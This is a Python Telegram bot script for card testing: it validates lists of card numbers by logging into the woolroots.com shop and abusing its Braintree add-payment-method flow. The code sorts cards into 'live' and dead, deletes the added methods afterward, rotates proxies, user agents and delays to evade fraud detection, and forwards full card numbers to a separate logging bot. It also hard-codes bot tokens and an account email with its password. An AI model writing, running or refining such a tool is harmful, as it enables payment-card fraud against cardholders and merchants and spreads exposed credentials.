"""
Woolroots B3 Checker
Owner: @DarkCarder05
"""
import os
import re
import time
import base64
import random
import uuid
import threading
import logging
import itertools
from threading import Lock

import requests
from bs4 import BeautifulSoup
import telebot
from telebot import types

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
logger = logging.getLogger("wool")

# ==================== CONFIG ====================
BOT_TOKEN = "8031306974:AAGj-WcGWWeapvJO1VjQf6zp_cqNSjyiBHs"
OWNER_ID = 7077294261
OWNER_TAG = "@DarkCarder05"
BOT_NAME = "TON B3 CHECKER"

LOG_BOT_TOKEN = "7700737624:AAFreN2QjMjSGGphrqKeK_fVxIlI7NTfoNc"
LOG_CHAT_ID = OWNER_ID

SITE = "https://www.woolroots.com"
LOGIN_URL = SITE + "/my-account/"
ADD_PM_URL = SITE + "/my-account/add-payment-method/"
AJAX_URL = SITE + "/wp-admin/admin-ajax.php"
BT_GRAPHQL = "https://payments.braintree-api.com/graphql"

LOGIN_USER = "lagxd71@gmail.com"
LOGIN_PASS = "90901212Aa@"

DELAY_MIN = 3
DELAY_MAX = 7

# ==================== LOG BOT ====================
log_bot = None
try:
    log_bot = telebot.TeleBot(LOG_BOT_TOKEN, parse_mode="HTML")
    logger.info("Log bot initialized")
except Exception as e:
    logger.error("Log bot init fail: " + str(e))


def log_to_bot(text):
    if not log_bot:
        return
    try:
        log_bot.send_message(LOG_CHAT_ID, text, parse_mode="HTML")
    except Exception as ex:
        logger.warning("log bot send fail: " + str(ex)[:60])


# ==================== PROXIES ====================
PROXY_USER = ""
PROXY_PASS = ""
RAW_HOSTS = []


def _build_proxies():
    out = []
    for h in RAW_HOSTS:
        if PROXY_USER and PROXY_PASS:
            out.append("http://" + PROXY_USER + ":" + PROXY_PASS + "@" + h)
        else:
            out.append("http://" + h)
    return out


PROXIES = _build_proxies()
_proxy_cycle = itertools.cycle(PROXIES) if PROXIES else None
_proxy_lock = Lock()


def next_proxy():
    if not _proxy_cycle:
        return None
    with _proxy_lock:
        return next(_proxy_cycle)


def proxy_dict(p):
    if not p:
        return None
    return {"http": p, "https": p}


def masked_proxy(p):
    if not p:
        return "DIRECT"
    if "@" in p:
        return p.split("@")[-1]
    return p.replace("http://", "").replace("https://", "")


# ==================== UA ====================
UAS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
]


def rand_ua():
    return random.choice(UAS)


# ==================== NONCE ====================
NONCE_PATTERNS = [
    r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"',
    r"name='woocommerce-add-payment-method-nonce'\s+value='([^']+)'",
    r'name="wc_braintree_add_payment_method_nonce"\s+value="([^"]+)"',
    r'name="_woocommerce_add_payment_method_nonce"\s+value="([^"]+)"',
    r'name="wc-braintree-add-payment-method-nonce"\s+value="([^"]+)"',
    r'name="woocommerce_add_payment_method_nonce"\s+value="([^"]+)"',
    r'id="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"',
    r'"add_payment_method_nonce"\s*:\s*"([^"]+)"',
    r'add-payment-method-nonce["\']?\s*[:=]\s*["\']([^"\']+)',
    r'add_payment_method_nonce["\']?\s*[:=]\s*["\']([^"\']+)',
    r'name=["\']_wpnonce["\']\s+value=["\']([^"\']+)',
]


def extract_nonce(html):
    for p in NONCE_PATTERNS:
        m = re.search(p, html, re.I | re.S)
        if m:
            return m.group(1)
    return None


# ==================== STATE ====================
STOP_FLAG = {"stop": False}
_BIN_CACHE = {}
_last_edit_time = {}
_last_edit_text = {}


def luhn_ok(number):
    try:
        digits = [int(d) for d in str(number) if d.isdigit()]
        if len(digits) < 12:
            return False
        s = 0
        for i, d in enumerate(reversed(digits)):
            if i % 2 == 1:
                d *= 2
                if d > 9:
                    d -= 9
            s += d
        return s % 10 == 0
    except:
        return False


def parse_card(line):
    parts = re.split(r"[|/, ]+", line.strip())
    if len(parts) < 4:
        return None
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    cc = re.sub(r"\D", "", cc)
    if not (13 <= len(cc) <= 19):
        return None
    if not luhn_ok(cc):
        return None
    if not (mm.isdigit() and 1 <= int(mm) <= 12):
        return None
    if not (yy.isdigit() and len(yy) in (2, 4)):
        return None
    if not (cvv.isdigit() and len(cvv) in (3, 4)):
        return None
    mm = mm.zfill(2)
    if len(yy) == 4:
        yy = yy[2:]
    return cc, mm, yy, cvv


def bin_lookup(cc):
    b = cc[:6]
    if b in _BIN_CACHE:
        return _BIN_CACHE[b]
    try:
        r = requests.get(
            "https://lookup.binlist.net/" + b,
            headers={"Accept-Version": "3"},
            timeout=8
        ).json()
        info = (str(r.get('scheme', '-')) + " " + str(r.get('type', '-')) + " " + str(r.get('brand', '-'))).upper()
        bank = str(r.get('bank', {}).get('name', '-')).upper()
        country = str(r.get('country', {}).get('name', '-')) + " " + str(r.get('country', {}).get('emoji', ''))
        _BIN_CACHE[b] = (info, bank, country)
        return info, bank, country
    except:
        _BIN_CACHE[b] = ("UNKNOWN", "UNKNOWN", "UNKNOWN")
        return "UNKNOWN", "UNKNOWN", "UNKNOWN"


# ==================== DELETE ====================
def extract_delete_link(html, base_url):
    try:
        soup = BeautifulSoup(html, "html.parser")
        for sel in ['a[href*="delete-payment-method"]', 'a[href*="delete"]']:
            el = soup.select_one(sel)
            if el and el.get("href"):
                href = el["href"]
                if href.startswith("http"):
                    return href
                return base_url.rstrip("/") + "/" + href.lstrip("/")
        m = re.search(r'href="([^"]*delete-payment-method[^"]*)"', html, re.I)
        if m:
            href = m.group(1).replace("&amp;", "&")
            if href.startswith("http"):
                return href
            return base_url.rstrip("/") + "/" + href.lstrip("/")
    except:
        pass
    return None


def delete_payment_method(session, delete_url):
    try:
        r = session.get(delete_url, timeout=25)
        if r.status_code != 200:
            return False, "GET " + str(r.status_code)
        m = re.search(r'name="_wpnonce" value="(.*?)"', r.text)
        if not m:
            m = re.search(r'name="woocommerce-delete-payment-method-nonce" value="(.*?)"', r.text)
        nonce = m.group(1) if m else None
        data = {"_wpnonce": nonce} if nonce else {}
        data["_wp_http_referer"] = "/my-account/add-payment-method/"
        soup = BeautifulSoup(r.text, "html.parser")
        for inp in soup.select("form input"):
            name = inp.get("name")
            val = inp.get("value", "")
            if name and name not in data:
                data[name] = val
        r2 = session.post(
            delete_url, data=data, timeout=25,
            headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": delete_url}
        )
        low = r2.text.lower()
        if any(k in low for k in ["deleted", "removed", "payment method successfully", "no payment methods", "no saved"]):
            return True, "deleted"
        if "delete-payment-method" not in r2.text:
            return True, "deleted"
        return False, "unclear"
    except Exception as ex:
        return False, "EXC: " + str(ex)[:40]


def ensure_clean_slate(session):
    try:
        r = session.get(ADD_PM_URL, timeout=25)
        soup = BeautifulSoup(r.text, "html.parser")
        for a in soup.select('a[href*="delete-payment-method"]'):
            href = a.get("href")
            if href:
                if not href.startswith("http"):
                    href = SITE.rstrip("/") + "/" + href.lstrip("/")
                delete_payment_method(session, href)
    except:
        pass


# ==================== UI ====================
def _edit_progress(chat_id, msg_id, i, total, ok, bad, risk, err, del_fail,
                   masked_card, stage_text, start, stage_num=0, stage_total=7,
                   response_preview=""):
    key = (chat_id, msg_id)
    now = time.time()
    last = _last_edit_time.get(key, 0)

    elapsed = time.time() - start
    speed = i / max(elapsed, 1)

    bar_len = 14
    filled = int(bar_len * i / total) if total else 0
    bar = "*" * filled + "-" * (bar_len - filled)
    pct = int(100 * i / total) if total else 0

    stage_filled = min(stage_num, stage_total)
    stage_bar = "o" * stage_filled + "." * (stage_total - stage_filled)

    lines = []
    lines.append("===============================")
    lines.append("   TON B3 LIVE CHECK")
    lines.append("===============================")
    lines.append("")
    lines.append("Progress  >>  <code>" + str(i) + " / " + str(total) + "</code>")
    lines.append("[" + bar + "] <b>" + str(pct) + "%</b>")
    lines.append("")
    lines.append("Current Card")
    lines.append("<code>" + str(masked_card) + "</code>")
    lines.append("")
    lines.append("Live Stage  [" + stage_bar + "]")
    lines.append(str(stage_text))

    if response_preview:
        lines.append("")
        lines.append("Response: <code>" + str(response_preview) + "</code>")

    lines.append("")
    lines.append("-------------------------------")
    lines.append("Statistics")
    lines.append("")
    lines.append("  Approved  >>  <code>" + str(ok) + "</code>")
    lines.append("  Declined  >>  <code>" + str(bad) + "</code>")
    lines.append("  Risk      >>  <code>" + str(risk) + "</code>")
    lines.append("  Error     >>  <code>" + str(err) + "</code>")
    lines.append("  Del-fail  >>  <code>" + str(del_fail) + "</code>")
    lines.append("")
    lines.append("-------------------------------")
    lines.append("Time: <code>" + str(int(elapsed)) + "s</code>  "
                 "Speed: <code>" + str(round(speed, 2)) + "/s</code>")
    lines.append("Mode: <code>Direct</code>  "
                 "Log: " + ("<code>ON</code>" if log_bot else "<code>OFF</code>"))
    lines.append("")
    lines.append("-------------------------------")
    lines.append("Bot By " + OWNER_TAG)

    new_text = "\n".join(lines)

    if now - last < 1.5 and _last_edit_text.get(key) == new_text:
        return
    _last_edit_time[key] = now
    _last_edit_text[key] = new_text

    try:
        bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text=new_text, parse_mode="HTML"
        )
    except Exception as ex:
        if "not modified" not in str(ex).lower():
            logger.warning("edit fail: " + str(ex)[:60])


# ==================== CORE ====================
def check_card_with_logs(line, chat_id, msg_id, i, total,
                         ok, bad, risk, err, del_fail, start):
    parsed = parse_card(line)
    if not parsed:
        return {
            "status": "error", "response": "INVALID_FORMAT", "card": line,
            "bin": "-", "bank": "-", "country": "-",
            "deleted": None, "delete_msg": "", "proxy": "-"
        }

    cc, mm, yy, cvv = parsed
    masked = cc[:6] + "******" + cc[-4:]

    proxy = next_proxy()
    return _attempt_check_with_logs(
        parsed, proxy, chat_id, msg_id, i, total,
        ok, bad, risk, err, del_fail, start, masked
    )


def _attempt_check_with_logs(parsed, proxy, chat_id, msg_id, i, total,
                             ok, bad, risk, err, del_fail, start, masked):
    cc, mm, yy, cvv = parsed
    proxies = proxy_dict(proxy)
    ua = rand_ua()

    s = requests.Session()
    s.headers.update({"User-Agent": ua, "Accept-Language": "en-US,en;q=0.9"})
    if proxies:
        s.proxies = proxies

    base = {
        "card": cc, "bin": "-", "bank": "-", "country": "-",
        "deleted": None, "delete_msg": "", "proxy": masked_proxy(proxy)
    }

    def log(stage, stage_num=0, resp=""):
        _edit_progress(
            chat_id, msg_id, i, total, ok, bad, risk, err, del_fail,
            masked, stage, start, stage_num=stage_num, response_preview=resp
        )

    try:
        log("Stage 1/7: Opening login page", 1)
        r = s.get(LOGIN_URL, timeout=25)
        m = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', r.text)
        if not m:
            return _err("LOGIN_NONCE_FAIL", base, masked)

        log("Stage 2/7: Logging in...", 2)
        r = s.post(
            LOGIN_URL,
            headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": LOGIN_URL},
            data={
                "username": LOGIN_USER, "password": LOGIN_PASS,
                "woocommerce-login-nonce": m.group(1),
                "_wp_http_referer": "/my-account/", "login": "Log in"
            },
            timeout=25
        )
        if "logout" not in r.text.lower() and "/my-account" not in r.url:
            return _err("LOGIN_FAIL", base, masked)

        log("Stage 3/7: Cleaning old methods", 3)
        ensure_clean_slate(s)

        log("Stage 4/7: Loading payment page", 4)
        r = s.get(ADD_PM_URL, headers={"Referer": LOGIN_URL}, timeout=25)
        m = re.search(r'"client_token_nonce":"(.*?)"', r.text)
        if not m:
            return _err("NO_CLIENT_NONCE", base, masked)
        client_nonce = m.group(1)

        log("Stage 5/7: Getting Braintree token", 5)
        r = s.post(
            AJAX_URL,
            headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": SITE, "Referer": ADD_PM_URL
            },
            data={"action": "wc_braintree_credit_card_get_client_token", "nonce": client_nonce},
            timeout=25
        )
        m = re.search(r'"data":"(.*?)"', r.text)
        if not m:
            return _err("NO_CLIENT_TOKEN", base, masked)
        try:
            decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
        except:
            return _err("TOKEN_DECODE_FAIL", base, masked)
        m = re.search(r'"authorizationFingerprint":"(.*?)"', decoded)
        if not m:
            return _err("NO_AUTH_FP", base, masked)
        auth_fp = m.group(1)

        log("Stage 6/7: Tokenizing card at Braintree", 6)
        bt_headers = {
            "authority": "payments.braintree-api.com",
            "authorization": "Bearer " + auth_fp,
            "braintree-version": "2018-05-10",
            "content-type": "application/json",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
            "user-agent": ua,
        }
        payload = {
            "clientSdkMetadata": {
                "source": "client", "integration": "custom",
                "sessionId": str(uuid.uuid4())
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc, "expirationMonth": mm,
                        "expirationYear": yy, "cvv": cvv
                    },
                    "options": {"validate": False}
                }
            },
            "operationName": "TokenizeCreditCard",
        }
        r = requests.post(BT_GRAPHQL, headers=bt_headers, json=payload, proxies=proxies, timeout=30)
        try:
            j = r.json()
        except:
            return _err("BT_BAD_RESPONSE", base, masked)

        if "errors" in j:
            err_str = str(j["errors"]).lower()
            if "cvv" in err_str or "security code" in err_str:
                log("Stage 6/7: CVV (Card Live)", 6, "CVV_MISMATCH (Card Live)")
                return _ok("approved", "CVV_MISMATCH (Card Live)", cc, base, masked)
            if "expired" in err_str or "expiration" in err_str:
                log("Stage 6/7: Expired card", 6, "EXPIRED_CARD")
                return _ok("declined", "EXPIRED_CARD", cc, base, masked)
            if "invalid" in err_str or "not a valid" in err_str or "invalid number" in err_str:
                log("Stage 6/7: Invalid card number", 6, "INVALID_CARD")
                return _ok("declined", "INVALID_CARD", cc, base, masked)
            if "insufficient" in err_str or "not enough" in err_str:
                log("Stage 6/7: Insufficient (Card Live)", 6, "INSUFFICIENT (Card Live)")
                return _ok("approved", "INSUFFICIENT_FUNDS (Card Live)", cc, base, masked)
            log("Stage 6/7: BT Error", 6, "BT: " + err_str[:40])
            return _ok("declined", "BT: " + err_str[:60], cc, base, masked)

        token = (j.get("data", {}).get("tokenizeCreditCard", {}) or {}).get("token")
        if not token:
            log("Stage 6/7: No token", 6, "NO_TOKEN_FROM_BT")
            return _ok("declined", "NO_TOKEN_FROM_BT", cc, base, masked)

        log("Stage 7/7: Posting card to site", 7)
        r = s.get(ADD_PM_URL, headers={"Referer": ADD_PM_URL}, timeout=25)

        try:
            with open("debug_add_page.html", "w", encoding="utf-8") as f:
                f.write(r.text)
        except:
            pass

        add_nonce = extract_nonce(r.text)
        if not add_nonce:
            log("Stage 7/7: Nonce not found", 7, "NO_ADD_NONCE")
            return _err("NO_ADD_NONCE", base, masked)

        r = s.post(
            ADD_PM_URL,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": SITE, "Referer": ADD_PM_URL
            },
            data={
                "payment_method": "braintree_credit_card",
                "wc-braintree-credit-card-card-type": "visa",
                "wc-braintree-credit-card-3d-secure-enabled": "",
                "wc-braintree-credit-card-3d-secure-verified": "",
                "wc-braintree-credit-card-3d-secure-order-total": "0.00",
                "wc_braintree_credit_card_payment_nonce": token,
                "wc_braintree_device_data": '{"correlation_id":"' + uuid.uuid4().hex + '"}',
                "wc-braintree-credit-card-tokenize-payment-method": "true",
                "woocommerce-add-payment-method-nonce": add_nonce,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1",
            },
            timeout=40
        )

        soup = BeautifulSoup(r.text, "html.parser")
        msg = ""
        try:
            el = soup.find("i", class_="nm-font nm-font-close")
            if el and el.parent:
                msg = el.parent.text.strip()
        except:
            pass
        if not msg:
            for sel in [".woocommerce-error li", ".woocommerce-message", ".woocommerce-info", "ul.woocommerce-error"]:
                el = soup.select_one(sel)
                if el:
                    msg = el.text.strip()
                    break
        low = (msg + " " + r.text[:1200]).lower()

        added = any(k in low for k in ["new payment method added", "payment method successfully added", "successfully added"])
        avs_reject = "gateway rejected" in low and "avs" in low
        duplicate = "duplicate card exists" in low
        insufficient = "insufficient" in low or "not enough" in low
        cvv_reject = "gateway rejected" in low and ("cvv" in low or "cvc" in low)
        avs_reject_2 = "avs" in low and "rejected" in low

        approved = added or avs_reject or duplicate or insufficient or cvv_reject or avs_reject_2

        if approved:
            if added:
                label = "CARD ADDED"
            elif avs_reject or avs_reject_2:
                label = "AVS REJECT (Card Live)"
            elif duplicate:
                label = "DUPLICATE (Card Live)"
            elif insufficient:
                label = "INSUFFICIENT (Card Live)"
            elif cvv_reject:
                label = "CVV REJECT (Card Live)"
            else:
                label = "APPROVED"

            log("Stage 7/7: " + label, 7, label)

            deleted = None
            del_msg = ""
            if added:
                r2 = s.get(ADD_PM_URL, headers={"Referer": ADD_PM_URL}, timeout=25)
                del_url = extract_delete_link(r2.text, SITE)
                if del_url:
                    ok_del, del_msg = delete_payment_method(s, del_url)
                    deleted = bool(ok_del)
                else:
                    deleted = False
                    del_msg = "no link"
            base["deleted"] = deleted
            base["delete_msg"] = del_msg
            return _ok("approved", label, cc, base, masked)

        if "risk" in low or "fraud" in low:
            log("Stage 7/7: Risk flagged", 7, "RISK")
            return _ok("risk", "RISK: " + (msg[:60] or "flagged"), cc, base, masked)
        if "expired" in low:
            log("Stage 7/7: Expired", 7, "EXPIRED_CARD")
            return _ok("declined", "EXPIRED_CARD", cc, base, masked)
        if "invalid" in low:
            log("Stage 7/7: Invalid", 7, "INVALID_CARD")
            return _ok("declined", "INVALID_CARD", cc, base, masked)

        final_msg = msg[:80] if msg else "DECLINED (no message)"
        log("Stage 7/7: " + final_msg[:40], 7, final_msg)
        return _ok("declined", final_msg, cc, base, masked)

    except requests.exceptions.Timeout:
        log("Stage: Timeout", 0, "TIMEOUT")
        return _err("TIMEOUT", base, masked)
    except requests.exceptions.ConnectionError:
        log("Stage: Connection error", 0, "CONNECTION_ERROR")
        return _err("CONNECTION_ERROR", base, masked)
    except Exception as ex:
        log("Stage: " + str(ex)[:40], 0, "EXC: " + str(ex)[:40])
        return _err("EXC: " + str(ex)[:60], base, masked)
    finally:
        try:
            s.close()
        except:
            pass


def _ok(status, response, cc, base, masked):
    info, bank, country = bin_lookup(cc)
    r = {
        "status": status, "response": response, "card": cc,
        "bin": info, "bank": bank, "country": country,
        "deleted": base.get("deleted"), "delete_msg": base.get("delete_msg", ""),
        "proxy": base.get("proxy", "-")
    }
    _log_result_to_bot(r, masked)
    return r


def _err(reason, base, masked):
    info, bank, country = bin_lookup(base["card"])
    r = {
        "status": "error", "response": reason, "card": base["card"],
        "bin": info, "bank": bank, "country": country,
        "deleted": None, "delete_msg": "",
        "proxy": base.get("proxy", "-")
    }
    _log_result_to_bot(r, masked)
    return r


def _log_result_to_bot(r, masked):
    status = r["status"]
    emoji = {"approved": "APPROVED", "declined": "DECLINED", "risk": "RISK", "error": "ERROR"}.get(status, "UNKNOWN")
    text = "<b>" + emoji + "</b>\n"
    text += "-------------------------------\n"
    text += "CC: <code>" + str(r['card']) + "</code>\n"
    text += "Response: <code>" + str(r['response']) + "</code>\n"
    text += "BIN: <code>" + str(r['bin']) + "</code>\n"
    text += "Bank: <code>" + str(r['bank']) + "</code>\n"
    text += "Country: <code>" + str(r['country']) + "</code>\n"
    text += "-------------------------------"
    log_to_bot(text)


# ==================== BOT ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")


@bot.message_handler(commands=["start"])
def cmd_start(msg):
    name = msg.from_user.first_name or "User"
    log_status = "Active" if log_bot else "Inactive"

    text = "===============================\n"
    text += "   TON B3 CHECKER\n"
    text += "===============================\n\n"
    text += "Welcome <b>" + name + "</b>!\n\n"
    text += "Gateway:  <code>Braintree (B3)</code>\n"
    text += "Site:     <code>woolroots.com</code>\n"
    text += "Mode:     <code>Direct</code>\n"
    text += "Log Bot:  <code>" + log_status + "</code>\n"
    text += "Status:   <code>Online</code>\n\n"
    text += "-------------------------------\n"
    text += "How to use:\n\n"
    text += "  1. Send <code>.txt</code> file with cards\n"
    text += "  2. Reply to it with <code>/chk</code>\n"
    text += "  3. Watch live stages\n\n"
    text += "-------------------------------\n"
    text += "Card format:\n"
    text += "<code>4111111111111111|12|26|123</code>\n\n"
    text += "Bot By " + OWNER_TAG
    bot.reply_to(msg, text)


@bot.message_handler(commands=["stop"])
def cmd_stop(msg):
    STOP_FLAG["stop"] = True
    bot.reply_to(msg, "Stopping...")


@bot.message_handler(commands=["chk"])
def cmd_chk(msg):
    replied = msg.reply_to_message
    if not replied or not replied.document:
        bot.reply_to(msg, "Reply /chk to a .txt file")
        return
    if msg.from_user.id != OWNER_ID:
        bot.reply_to(msg, "Not authorized")
        return
    doc = replied.document
    if not doc.file_name.endswith(".txt"):
        bot.reply_to(msg, "Only .txt files")
        return
    try:
        file_info = bot.get_file(doc.file_id)
        content = bot.download_file(file_info.file_path).decode("utf-8", errors="ignore")
    except Exception as ex:
        bot.reply_to(msg, "Download failed: " + str(ex))
        return
    lines = [l.strip() for l in content.splitlines() if l.strip() and not l.startswith("#")]
    parsed = [l for l in lines if parse_card(l)]
    if not parsed:
        bot.reply_to(msg, "No valid cards")
        return
    STOP_FLAG["stop"] = False

    log_status = "Active" if log_bot else "Off"
    start_text = "===============================\n"
    start_text += "   STARTING CHECK\n"
    start_text += "===============================\n\n"
    start_text += "File:     <code>" + str(doc.file_name) + "</code>\n"
    start_text += "Cards:    <code>" + str(len(parsed)) + "</code>\n"
    start_text += "Mode:     <code>Direct</code>\n"
    start_text += "Log Bot:  <code>" + log_status + "</code>\n\n"
    start_text += "Live stages below"
    bot.reply_to(msg, start_text)
    threading.Thread(target=run_check, args=(msg.chat.id, parsed), daemon=True).start()


def run_check(chat_id, cards):
    try:
        total = len(cards)
        ok = bad = risk = err = 0
        delete_fail = 0
        start = time.time()

        initial = "===============================\n"
        initial += "   TON B3 LIVE CHECK\n"
        initial += "===============================\n\n"
        initial += "Progress  >>  <code>0 / " + str(total) + "</code>\n"
        initial += "[--------------] <b>0%</b>\n\n"
        initial += "Starting..."

        try:
            status_msg = bot.send_message(chat_id, initial)
            msg_id = status_msg.message_id
        except Exception as ex:
            logger.error("send_message fail: " + str(ex))
            return

        for i, card in enumerate(cards, 1):
            if STOP_FLAG["stop"]:
                try:
                    bot.edit_message_text(
                        chat_id=chat_id, message_id=msg_id,
                        text="Stopped at " + str(i-1) + "/" + str(total),
                        parse_mode="HTML"
                    )
                except:
                    pass
                break

            parsed = parse_card(card)
            masked = "invalid"
            if parsed:
                cc = parsed[0]
                masked = cc[:6] + "******" + cc[-4:]

            try:
                r = check_card_with_logs(card, chat_id, msg_id, i, total,
                                         ok, bad, risk, err, delete_fail, start)
            except Exception as ex:
                logger.error("check_card fail: " + str(ex))
                r = {
                    "status": "error", "response": "EXC: " + str(ex), "card": card,
                    "bin": "-", "bank": "-", "country": "-",
                    "deleted": None, "delete_msg": "", "proxy": "-"
                }
                _log_result_to_bot(r, masked)

            if r["status"] == "approved":
                ok += 1
                if r.get("deleted") is False:
                    delete_fail += 1
                try:
                    _send_hit(chat_id, r)
                except Exception as ex:
                    logger.error("send_hit fail: " + str(ex))
            elif r["status"] == "risk":
                risk += 1
            elif r["status"] == "declined":
                bad += 1
            else:
                err += 1

            _last_edit_time.pop((chat_id, msg_id), None)

            if r["status"] == "approved":
                final_stage = "Approved: " + str(r["response"])[:40]
            elif r["status"] == "declined":
                final_stage = "Declined: " + str(r["response"])[:40]
            elif r["status"] == "risk":
                final_stage = "Risk: flagged"
            else:
                final_stage = "Error: " + str(r["response"])[:40]

            try:
                _edit_progress(
                    chat_id, msg_id, i, total, ok, bad, risk, err, delete_fail,
                    masked, final_stage, start, stage_num=7,
                    response_preview=r["response"][:50]
                )
            except Exception as ex:
                logger.warning("progress edit fail: " + str(ex))

            time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))

        elapsed = time.time() - start
        summary = "===============================\n"
        summary += "   CHECK FINISHED\n"
        summary += "===============================\n\n"
        summary += "Total:      <code>" + str(total) + "</code>\n"
        summary += "Approved:   <code>" + str(ok) + "</code>\n"
        summary += "Declined:   <code>" + str(bad) + "</code>\n"
        summary += "Risk:       <code>" + str(risk) + "</code>\n"
        summary += "Error:      <code>" + str(err) + "</code>\n"
        summary += "Del-fail:   <code>" + str(delete_fail) + "</code>\n\n"
        summary += "-------------------------------\n"
        summary += "Time:  <code>" + str(int(elapsed)) + "s</code>\n"
        summary += "Speed: <code>" + str(round(total/max(elapsed,1), 2)) + " cards/s</code>\n\n"
        summary += "Bot By " + OWNER_TAG

        try:
            bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id,
                text=summary, parse_mode="HTML"
            )
        except:
            try:
                bot.send_message(chat_id, summary, parse_mode="HTML")
            except Exception as ex:
                logger.error("summary send fail: " + str(ex))

        log_text = "CHECK FINISHED\n"
        log_text += "-------------------------------\n"
        log_text += "Total: <code>" + str(total) + "</code>\n"
        log_text += "Approved: <code>" + str(ok) + "</code>\n"
        log_text += "Declined: <code>" + str(bad) + "</code>\n"
        log_text += "Risk: <code>" + str(risk) + "</code>\n"
        log_text += "Error: <code>" + str(err) + "</code>\n"
        log_text += "Time: " + str(int(elapsed)) + "s"
        log_to_bot(log_text)
    except Exception as ex:
        logger.error("run_check CRASHED: " + str(ex))
        try:
            bot.send_message(chat_id, "Checker crashed: " + str(ex)[:200], parse_mode="HTML")
        except:
            pass


def _send_hit(chat_id, r):
    del_line = ""
    if r.get("deleted") is True:
        del_line = "Deleted: YES\n"
    elif r.get("deleted") is False:
        del_line = "Deleted: NO\n"

    text = "===============================\n"
    text += "   APPROVED\n"
    text += "===============================\n\n"
    text += "CC:\n"
    text += "<code>" + str(r['card']) + "</code>\n\n"
    text += "Response:\n"
    text += "<b>" + str(r['response']) + "</b>\n\n"
    text += "Gateway: Braintree\n"
    text += "Mode: Direct\n"
    text += del_line
    text += "\n"
    text += "BIN: <code>" + str(r['bin']) + "</code>\n"
    text += "Bank: <code>" + str(r['bank']) + "</code>\n"
    text += "Country: <code>" + str(r['country']) + "</code>\n\n"
    text += "-------------------------------\n"
    text += "Bot By " + OWNER_TAG

    try:
        bot.send_message(chat_id, text, parse_mode="HTML")
    except Exception as ex:
        logger.warning("hit send fail: " + str(ex))
    try:
        with open("hits_woolroots.txt", "a") as f:
            f.write(str(r['card']) + " | " + str(r['response']) + " | " + str(r['bin']) + " | " + str(r['bank']) + " | del=" + str(r.get('deleted')) + "\n")
    except:
        pass


# ==================== MAIN ====================
if __name__ == "__main__":
    print("Starting " + BOT_NAME + "...")
    print("Mode: Direct (no proxy)")
    print("Token: " + BOT_TOKEN[:15] + "...")
    print("Owner: " + str(OWNER_ID))
    print("Log Bot: " + (LOG_BOT_TOKEN[:15] + "..." if log_bot else "OFF"))
    bot.infinity_polling(timeout=30, long_polling_timeout=30)
